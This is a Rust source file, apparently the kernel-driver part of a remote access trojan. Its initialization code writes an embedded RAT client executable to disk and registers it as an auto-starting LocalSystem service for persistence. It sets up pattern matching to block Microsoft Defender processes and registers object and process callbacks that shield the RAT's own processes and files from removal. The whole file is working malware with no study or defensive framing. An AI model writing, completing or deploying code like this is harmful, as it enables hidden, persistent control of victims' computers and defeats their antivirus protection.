use alloc::boxed::Box;
use alloc::collections::BTreeSet;
use core::ffi::c_void;
use core::sync::atomic::Ordering;
use core::{mem, ptr, slice};

use aho_corasick::AhoCorasickBuilder;
use const_format::formatcp;
use rat_common::utils::DropGuard;
use rat_common::windows::RAT_CLIENT_SERVICE_NAME;
use rat_common::windows::kernel::KernelHandoff;
use wdk::nt_success;
use wdk_sys::_MODE::KernelMode;
use wdk_sys::ntddk::{KeDelayExecutionThread, RtlInitUnicodeString, ZwClose, ZwCreateKey};
use wdk_sys::{
    HANDLE, KEY_ALL_ACCESS, LARGE_INTEGER, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE,
    OBJECT_ATTRIBUTES, REG_EXPAND_SZ, REG_OPTION_NON_VOLATILE, REG_SZ, SERVICE_AUTO_START,
    SERVICE_ERROR_NORMAL, SERVICE_WIN32_OWN_PROCESS, UNICODE_STRING,
};
use widestring::{U16CStr, u16cstr};

use crate::global::{
    MAX_INITIALIZE_ATTEMPTS, MS_DEFENDER_AHO_CORASICK, MS_DEFENDER_PROCESS_PATTERN,
    OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT,
    PROCESS_NOTIFY_ROUTINE, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
    RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY, RAT_DEVICE_OBJECT, SELF_DEFENSE_PIDS,
};
use crate::handlers::{device, object, process};
use crate::wrappers::bindings::InitializeObjectAttributes;
use crate::wrappers::lock::SpinLock;
use crate::wrappers::{fs, registry};
use crate::{cleanup, error, info};

pub unsafe extern "C" fn initialize_thread_routine(extra: *mut c_void) {
    let extra = unsafe { Box::from_raw(extra.cast()) };
    let mut sleep = LARGE_INTEGER { QuadPart: -3000000 }; // 300 ms

    for retry in 0..MAX_INITIALIZE_ATTEMPTS {
        info!(
            "Initialization attempt #{}/{MAX_INITIALIZE_ATTEMPTS}",
            retry + 1,
        );
        let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
        if !nt_success(status) {
            error!("KeDelayExecutionThread error: 0x{status:X}");
            break;
        }

        if initialize(&extra).is_ok() {
            return;
        }
    }

    error!("Failed to initialize after {MAX_INITIALIZE_ATTEMPTS} attempts");
}

fn setup_service_registry(path: &U16CStr) -> anyhow::Result<()> {
    let mut attributes = OBJECT_ATTRIBUTES::default();
    let mut root_directory = UNICODE_STRING::default();
    unsafe {
        RtlInitUnicodeString(&mut root_directory, RAT_CLIENT_SERVICE_REGISTRY.as_ptr());
        InitializeObjectAttributes(
            &mut attributes,
            &mut root_directory,
            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
            ptr::null_mut(),
            ptr::null_mut(),
        );
    }

    let mut key = HANDLE::default();
    let status = unsafe {
        ZwCreateKey(
            &mut key,
            KEY_ALL_ACCESS,
            &mut attributes,
            0,
            ptr::null_mut(),
            REG_OPTION_NON_VOLATILE,
            ptr::null_mut(),
        )
    };
    anyhow::ensure!(nt_success(status), "ZwCreateKey error: 0x{status:X}");

    let guard = DropGuard::new(key, |key| unsafe {
        let _ = ZwClose(key);
    });

    // Reference: https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree
    for status in [
        registry::registry_write_string(
            key,
            u16cstr!("DisplayName"),
            u16cstr!(formatcp!("{RAT_CLIENT_SERVICE_NAME} Service")),
            REG_SZ,
        ),
        registry::registry_write_string(
            key,
            u16cstr!("Description"),
            u16cstr!(formatcp!("{RAT_CLIENT_SERVICE_NAME} Service")),
            REG_SZ,
        ),
        registry::registry_write_string(key, u16cstr!("ImagePath"), path, REG_EXPAND_SZ),
        registry::registry_write_dword(key, u16cstr!("Type"), SERVICE_WIN32_OWN_PROCESS),
        registry::registry_write_dword(key, u16cstr!("Start"), SERVICE_AUTO_START),
        registry::registry_write_dword(key, u16cstr!("ErrorControl"), SERVICE_ERROR_NORMAL),
        registry::registry_write_string(
            key,
            u16cstr!("ObjectName"),
            u16cstr!("LocalSystem"),
            REG_SZ,
        ),
    ] {
        anyhow::ensure!(nt_success(status), "ZwSetValueKey error: 0x{status:X}");
    }

    let _ = registry::registry_delete_value(key, u16cstr!("DeleteFlag"));

    drop(guard);
    Ok(())
}

fn drop_file() -> anyhow::Result<()> {
    let file = fs::File::create(RAT_CLIENT_OBJ_PATH.as_ptr())?;
    file.write(RAT_CLIENT)?;

    Ok(())
}

/// Interpret as a `&[u8]` slice for aho-corasick
fn u16cstr_to_buf(u16cstr: &U16CStr) -> &[u8] {
    unsafe {
        slice::from_raw_parts(
            u16cstr.as_ptr().cast(),
            u16cstr.len() * mem::size_of::<u16>(),
        )
    }
}

fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
    // Drop client executable
    drop_file().inspect_err(|e| {
        error!("Failed to drop RAT client: {e}");
    })?;

    // Create service registry key
    setup_service_registry(RAT_CLIENT_SERVICE_PATH).inspect_err(|e| {
        error!("Failed to setup service registry: {e}");
    })?;

    // Create Aho-Corasick automaton for MS Defender block
    let ac = AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build(
            MS_DEFENDER_PROCESS_PATTERN
                .iter()
                .map(|p| u16cstr_to_buf(p)),
        )
        .map_err(|e| {
            error!("Failed to build Aho-Corasick automaton for MS Defender block: {e}");
            anyhow::anyhow!("Aho-Corasick build error: {e}")
        })?;
    cleanup::cleanup_aho_corasick(
        MS_DEFENDER_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel),
    );

    // Create Aho-Corasick automaton for self-defense
    let ac = AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build([u16cstr_to_buf(RAT_CLIENT_OBJ_PATH_SELF_DEFENSE)])
        .map_err(|e| {
            error!("Failed to build Aho-Corasick automaton for object path: {e}");
            anyhow::anyhow!("Aho-Corasick build error: {e}")
        })?;
    cleanup::cleanup_aho_corasick(
        OBJ_PATH_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel),
    );

    // Register object callbacks for self-defense
    let ob = object::ob_register_callbacks(extra).inspect_err(|e| {
        error!("Failed to register object callbacks: {e}");
    })?;
    cleanup::cleanup_object_callbacks(OB_REGISTER_CALLBACKS_HANDLE.swap(ob, Ordering::AcqRel));

    // Register process creation/deletion callback
    let ps = process::ps_set_create_process_notify_routine_ex(extra).inspect_err(|e| {
        error!("Failed to register process callbacks: {e}");
    })?;
    cleanup::cleanup_process_notify_routine(
        PROCESS_NOTIFY_ROUTINE.swap(ps as *mut u8, Ordering::AcqRel),
    );

    // Construct data structure to track self-defense PIDs
    let pids = Box::into_raw(Box::new(SpinLock::new(BTreeSet::new())));
    cleanup::cleanup_self_defense_pids(SELF_DEFENSE_PIDS.swap(pids, Ordering::AcqRel));

    // Create device object
    let driver = ORIGINAL_DRIVER_OBJECT.load(Ordering::Acquire);
    let device = device::create_device(driver).inspect_err(|e| {
        error!("Failed to create device object: {e}");
    })?;
    cleanup::cleanup_device(RAT_DEVICE_OBJECT.swap(device, Ordering::AcqRel));

    Ok(())
}
